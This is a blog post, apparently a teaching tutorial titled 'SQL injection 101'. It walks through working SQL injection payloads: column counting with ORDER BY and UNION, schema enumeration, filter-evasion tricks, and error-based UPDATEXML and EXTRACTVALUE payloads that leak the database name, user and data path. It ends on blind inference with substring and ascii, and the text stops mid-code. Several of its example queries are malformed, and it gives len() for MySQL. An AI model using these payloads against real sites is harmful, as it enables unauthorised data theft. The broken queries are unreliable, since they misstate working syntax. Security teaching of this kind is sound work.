<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>SQLi - debidong's site</title><meta name=Description content="SQL injection 101"><meta property="og:title" content="SQLi"><meta property="og:description" content="SQL injection 101"><meta property="og:type" content="article"><meta property="og:url" content="http://www.debidong.github.io/posts/sqli/"><meta property="og:image" content="http://www.debidong.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-20T15:00:00+08:00"><meta property="article:modified_time" content="2023-10-20T15:00:00+08:00"><meta property="og:site_name" content="debidong's site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://www.debidong.github.io/logo.png"><meta name=twitter:title content="SQLi"><meta name=twitter:description content="SQL injection 101"><meta name=application-name content="debidong's site"><meta name=apple-mobile-web-app-title content="debidong's site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://www.debidong.github.io/posts/sqli/><link rel=prev href=http://www.debidong.github.io/posts/cve-2023-2317/><link rel=next href=http://www.debidong.github.io/posts/everything-about-https/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQLi","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/www.debidong.github.io\/posts\/sqli\/"},"genre":"posts","keywords":"cybersecurity, SQLi","wordcount":3236,"url":"http:\/\/www.debidong.github.io\/posts\/sqli\/","datePublished":"2023-10-20T15:00:00+08:00","dateModified":"2023-10-20T15:00:00+08:00","license":"debidong","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"debidong"},"description":"SQL injection 101"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="debidong's site">debidong's site</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/info/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="debidong's site">debidong's site</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/info/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SQLi</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=www.debidong.github.io title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>debidong</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-10-20>2023-10-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3236 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;16 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#0-basic-knowledge>0 Basic Knowledge</a><ul><li><a href=#01-comments-in-sql-statements>0.1 Comments in SQL Statements</a></li></ul></li><li><a href=#1-basic-steps>1 Basic Steps</a><ul><li><a href=#11-determining-the-number-of-columns-in-the-current-table>1.1 Determining the Number of Columns in the Current Table</a></li><li><a href=#12-determining-the-database-version>1.2 Determining the Database Version</a></li><li><a href=#13-viewing-all-table-names-in-the-database>1.3 Viewing All Table Names in the Database</a></li><li><a href=#14-viewing-all-column-names-of-a-table>1.4 Viewing All Column Names of a Table</a></li></ul></li><li><a href=#2-what-to-do-if-characters-are-filtered>2 What to Do If Characters Are Filtered?</a></li><li><a href=#3-error-based-injection>3 Error-Based Injection</a><ul><li><a href=#31-concat>3.1 <code>CONCAT</code></a></li><li><a href=#32-group_concat>3.2 <code>GROUP_CONCAT</code></a></li><li><a href=#33-updatexml>3.3 <code>UPDATEXML</code></a></li><li><a href=#34-extractvalue>3.4 <code>EXTRACTVALUE</code></a></li><li><a href=#35-right>3.5 <code>RIGHT</code></a></li></ul></li><li><a href=#4-blind-sql-injection>4 Blind SQL Injection</a><ul><li><a href=#41-inference-techniques>4.1 Inference Techniques</a></li><li><a href=#42-time-based-blind-sql-injection>4.2 Time-Based Blind SQL Injection</a></li><li><a href=#43-a-practical-example-of-sql-injection>4.3 A Practical Example of SQL Injection</a></li></ul></li></ul></nav></div></div><div class=content id=content><blockquote><p><em><strong>SQL injection</strong></em> is the placement of malicious code in SQL statements, via web page input. This can allow an attacker to view data that they are not normally able to retrieve.</p></blockquote><p>SQL injection can occur in:</p><ul><li>GET parameters</li><li>POST data</li><li>Cookies</li><li>Search fields</li><li>Certain fields in the HTTP request headers</li></ul><p>And so on, and so forth. As long as the request involves querying a backend database, there is a potential for SQL injection.</p><h2 id=0-basic-knowledge>0 Basic Knowledge</h2><ul><li><a href=https://dev.mysql.com/doc/refman/8.0/en/built-in-function-reference.html target=_blank rel="noopener noreffer">MySQL Built-In Function and Operator Reference</a></li><li><a href=https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Functions.html#GUID-D079EFD3-C683-441F-977E-2C9503089982 target=_blank rel="noopener noreffer">Oracle Built-In Function and Operator Reference</a></li><li><a href=https://www.w3schools.com/sql/sql_ref_sqlserver.asp target=_blank rel="noopener noreffer">MS SQL Server Built-In Function and Operator Reference</a></li></ul><h3 id=01-comments-in-sql-statements>0.1 Comments in SQL Statements</h3><ul><li><p>SQL Server / Oracle</p><p><code>-- text</code> <code>/*text*/</code></p></li><li><p>MySQL</p><p><code>-- text</code> <code>/*text*/</code> <code># text</code></p></li></ul><h2 id=1-basic-steps>1 Basic Steps</h2><ol><li><p><strong>Identifying Injection Points</strong></p><ul><li><p>Numeric Injection</p><ul><li><p><code>1+1</code> behaves the same as <code>2</code></p></li><li><p><code>1a</code> behaves the same as <code>1</code></p></li></ul></li><li><p><strong>String Injection</strong></p></li></ul></li><li><p><strong>Understanding Website Behavior</strong></p></li><li><p><strong>Sending Enumeration Queries</strong></p></li><li><p><strong>Summarizing WAF Behavior and Bypassing</strong></p></li><li><p><strong>Dumping the Database</strong></p></li></ol><h3 id=11-determining-the-number-of-columns-in-the-current-table>1.1 Determining the Number of Columns in the Current Table</h3><ul><li><p>Using <code>order by</code></p><p><code>' order by X</code> When the server returns an error for the query, it means X exceeds the number of columns in the current table.</p></li><li><p>Using <code>union</code></p><p><code>union select null, null, ...</code> When the server returns an error for the query, it means the number of payloads exceeds the number of columns in the current table.</p><p>For Oracle, you can use: <code>' UNION SELECT NULL FROM DUAL</code></p></li></ul><h3 id=12-determining-the-database-version>1.2 Determining the Database Version</h3><h4 id=121-using-select-for-direct-query>1.2.1 Using <code>select</code> for Direct Query</h4><table><thead><tr><th>Database Type</th><th>Query Statement</th></tr></thead><tbody><tr><td>Microsoft, MySQL</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>SELECT * FROM v$version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table><h4 id=122-testing>1.2.2 Testing</h4><ul><li>Original URL: <code>http://www.victim.com/displayeruser?user=Bob</code></li><li>MySQL doesn&rsquo;t throw an error: <code>http://www.victim.com/displayeruser?user=Bo' 'b</code></li><li>SQL Server doesn&rsquo;t throw an error: <code>http://www.victim.com/displayeruser?user=Bo'+'b</code></li><li>Oracle doesn&rsquo;t throw an error: <code>http://www.victim.com/displayeruser?user=Bo' || 'b</code></li></ul><h3 id=13-viewing-all-table-names-in-the-database>1.3 Viewing All Table Names in the Database</h3><blockquote><p><code>information_schema</code> is a metadata information repository in a database system that contains information about various elements and objects in the database. This database exists in most modern relational database management systems, including MySQL, PostgreSQL, SQLite, SQL Server, and others. <code>information_schema</code> contains tables such as:</p><ol><li><code>TABLES</code> Table: This table contains information about each table in the database, such as table name, table engine, number of rows, creation time, and more.</li><li><code>COLUMNS</code> Table: The <code>COLUMNS</code> table contains information about the columns in each table in the database, including column names, data types, default values, and whether they are primary keys.</li><li><code>STATISTICS</code> Table: This table stores index statistics information for tables, such as index names, index types, and column names.</li><li><code>KEY_COLUMN_USAGE</code> Table: This table contains information about keys in tables, including primary and foreign keys.</li><li><code>VIEWS</code> Table: The <code>VIEWS</code> table stores information about views in the database, including view names and view definitions.</li><li><code>ROUTINES</code> Table: This table contains information about stored procedures and functions in the database, including names, types, and definitions.</li><li><code>USER_PRIVILEGES</code> Table: This table contains information about user and role permissions, including granted permissions and object names.</li><li><code>SCHEMATA</code> Table: The <code>SCHEMATA</code> table contains information about database schemas, such as schema names and default character sets.</li></ol></blockquote><ul><li><p>Non-Oracle: Use <code>information_schema.tables</code></p><p>If using a table with 2 columns for a union query, you can use:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=p>,</span><span class=w> </span><span class=k>null</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w>
</span></span></span></code></pre></div><p><strong>If <code>information_schema</code> related fields are blocked</strong></p><ul><li><p><code>sys.schema_auto_increment_columns</code></p><p>It is used to monitor auto-incremented IDs in tables. When designing tables, auto-increment is often set for certain fields, and <code>schema_auto_increment_columns</code> stores database-related information about tables with auto-increment fields.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>table_schema</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>schema_auto_increment_columns</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>schema_auto_increment_columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;foo&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><blockquote><p>&ldquo;Schema&rdquo; refers to a namespace within a database used to organize and manage database objects, such as tables, views, stored procedures, functions, and more. A database can contain multiple different schemas, and each schema can contain a set of related tables and other objects.</p></blockquote></li><li><p><code>schema_table_statistics_with_buffer</code> and <code>x$schema_table_statistics_with_buffer</code></p></li></ul></li><li><p>Oracle: Use <code>all_tables</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tables</span><span class=w>
</span></span></span></code></pre></div></li></ul><h3 id=14-viewing-all-column-names-of-a-table>1.4 Viewing All Column Names of a Table</h3><ul><li><p>Non-Oracle: Use <code>information_schema.columns</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>X</span><span class=w>
</span></span></span></code></pre></div></li><li><p>Oracle: Use <code>all_tab_columns</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>all_tab_columns</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>X</span><span class=w>
</span></span></span></code></pre></div></li></ul><h2 id=2-what-to-do-if-characters-are-filtered>2 What to Do If Characters Are Filtered?</h2><ul><li><p>If <code></code>(Space) is filtered, you can use:</p><ul><li><p>Rewrite statements using <code>()</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Can be written as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=p>(</span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>users</span><span class=p>)</span><span class=k>where</span><span class=p>((</span><span class=n>school</span><span class=o>=</span><span class=s1>&#39;HEU&#39;</span><span class=p>)</span><span class=k>and</span><span class=p>(</span><span class=k>select</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=k>from</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>)));</span><span class=w>
</span></span></span></code></pre></div></li><li><p>Use <code>/**/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Can be written as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=cm>/**/</span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=cm>/**/</span><span class=k>from</span><span class=cm>/**/</span><span class=n>users</span><span class=cm>/**/</span><span class=k>where</span><span class=cm>/**/</span><span class=n>school</span><span class=o>=</span><span class=s1>&#39;HEU&#39;</span><span class=cm>/**/</span><span class=k>and</span><span class=cm>/**/</span><span class=k>select</span><span class=cm>/**/</span><span class=k>column_name</span><span class=cm>/**/</span><span class=k>from</span><span class=cm>/**/</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div></li><li><p>Use <code>%0a</code>, <code>%0b</code>, <code>%0c</code>, <code>%0d</code>, <code>%09</code>, <code>%a0</code></p></li></ul></li><li><p>If <code>=</code> is filtered, you can use <code>like</code></p><p><code>LIKE</code> is an operator used to perform fuzzy searches in text fields. It allows you to search for text data that matches a specified pattern (or wildcard).</p><ul><li><p><code>%</code>: Matches any sequence of characters, including an empty string. For example, <code>'a%'</code> matches any text starting with the letter &lsquo;a&rsquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>employees</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;John%&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div></li><li><p><code>_</code>: Matches any single character. For example, <code>'a_'</code> matches text starting with &lsquo;a&rsquo; and at least two characters.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>employees</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=s1>&#39;Sm_th&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div></li></ul></li></ul><h2 id=3-error-based-injection>3 Error-Based Injection</h2><h3 id=31-concat>3.1 <code>CONCAT</code></h3><p>In SQL, <code>CONCAT</code> is a function used to concatenate two or more <strong>strings</strong> together. It takes multiple parameters, each of which is a string to be concatenated. The <code>CONCAT</code> function concatenates these strings in the order of the parameters and returns a new string.</p><h3 id=32-group_concat>3.2 <code>GROUP_CONCAT</code></h3><p>In SQL, <code>GROUP_CONCAT</code> is used to combine <strong>multiple values</strong> from different rows into a single string, often used in conjunction with a <code>GROUP BY</code> clause (though it can be used without it).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><h3 id=33-updatexml>3.3 <code>UPDATEXML</code></h3><p><code>UPDATEXML</code> is an XML processing function in MySQL used to update XML data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>UPDATEXML</span><span class=p>(</span><span class=n>xml_target</span><span class=p>,</span><span class=w> </span><span class=n>xpath_expr</span><span class=p>,</span><span class=w> </span><span class=n>new_value</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>xml_target</code> is the XML data column or XML document to update (document object name).</li><li><code>xpath_expr</code> is an XPath expression that locates the XML element or attribute to be updated (document path).</li><li><code>new_value</code> is the new XML value to replace the selected XML element or attribute.</li></ul><p>When using <code>UPDATEXML</code>, if the <code>xpath_expr</code> format is incorrect, it will result in an XPath syntax error.</p><p>Example payload using <code>UPDATEXML</code> for error-based injection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1); #
</span></span></span></code></pre></div><h3 id=34-extractvalue>3.4 <code>EXTRACTVALUE</code></h3><p><code>EXTRACTVALUE</code> function is typically used with XML data to extract specific values from an XML document.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>EXTRACTVALUE</span><span class=p>(</span><span class=n>xml_document</span><span class=p>,</span><span class=w> </span><span class=n>xpath_expression</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>xml_document</code> is the column or expression containing the XML data.</li><li><code>xpath_expression</code> specifies the location of the XML data to be extracted.</li></ul><p>When using <code>EXTRACTVALUE</code>, if the <code>xpath_expr</code> format is incorrect, it will result in an XPath syntax error.</p><p>Example payload using <code>EXTRACTVALUE</code> for error-based injection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;</span><span class=n>myDatabase</span><span class=s1>&#39;))));#
</span></span></span></code></pre></div><h3 id=35-right>3.5 <code>RIGHT</code></h3><p><code>RIGHT</code> is used to extract a specified number of characters from the right side of a string. Because the return value of <code>EXTRACTVALUE</code> has a length limit, <code>RIGHT</code> can be used to display parts of the string beyond the length limit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>RIGHT</span><span class=p>(</span><span class=n>string</span><span class=p>,</span><span class=w> </span><span class=k>length</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>string</code> is the string from which to extract characters.</li><li><code>length</code> is the number of characters to extract from the right side.</li></ul><p>The <code>RIGHT</code> function returns a substring of the specified number of characters from the right side of the string. If <code>length</code> is greater than the actual length of the string, it will return the entire string.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>RIGHT</span><span class=p>(</span><span class=s1>&#39;Hello, World&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>5</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- &#34;World&#34;
</span></span></span></code></pre></div><h2 id=4-blind-sql-injection>4 Blind SQL Injection</h2><p><strong>Bad Development Practice</strong>: Failing to properly handle dynamic SQL and instead displaying a generic error page in response to database exceptions.</p><p>Blind SQL injection can be time-consuming. Once you understand its principles, it&rsquo;s recommended to use tools to enhance the efficiency of SQLi, such as SQLMap.</p><h3 id=41-inference-techniques>4.1 Inference Techniques</h3><h4 id=411-substring>4.1.1 <code>substring</code></h4><p>If the original query statement looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;[INPUT]&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>When <code>[INPUT]</code> is a normal string, like <code>HEU</code>, it will return the <strong>expected result</strong>. However, when the payload is <code>HEU' and '1'='2</code>, the query statement becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=o>=</span><span class=s1>&#39;2&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>The <code>where</code> clause will return an empty result set because <code>'1'='2'</code> is a constant false expression. At this point, the server returns a <strong>generic error</strong>.</p><p>With a slight modification, you can create a conditional statement that is sometimes true and sometimes false, such as: <code>HEU' and select column_name from substring(database(), 1, 1)='a</code>.</p><p>Injected into the query statement, it becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>If the first character of the current MySQL database name is <code>a</code>, it won&rsquo;t throw an error; otherwise, it will throw an error. This way, you can incrementally infer database names, table names, column names, and database information.</p><p>To determine the length of a value, you can use <code>len()</code>.</p><p>The drawback of this method is that it&rsquo;s <strong>slow</strong>.</p><h4 id=412-bitwise-comparison-ascii>4.1.2 Bitwise Comparison: <code>ascii()</code></h4><p><code>ascii()</code> returns the numeric value of the leftmost character of the string <code>str</code>. It returns <code>0</code> if <code>str</code> is an empty string and <code>NULL</code> if <code>str</code> is <code>NULL</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/1280px-USASCII_code_chart.png data-srcset="./assets/1280px-USASCII_code_chart.png, ./assets/1280px-USASCII_code_chart.png 1.5x, ./assets/1280px-USASCII_code_chart.png 2x" data-sizes=auto alt=./assets/1280px-USASCII_code_chart.png title=ascii></p><p>For each character, we can use a binary comparison approach to pinpoint the first character of the current database, which is &rsquo;s.&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>127</span><span class=p>;</span><span class=w> </span><span class=c1>--False
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>school</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;HEU&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>63</span><span class=p>;</span><span class=w> </span><span class=c1>--True
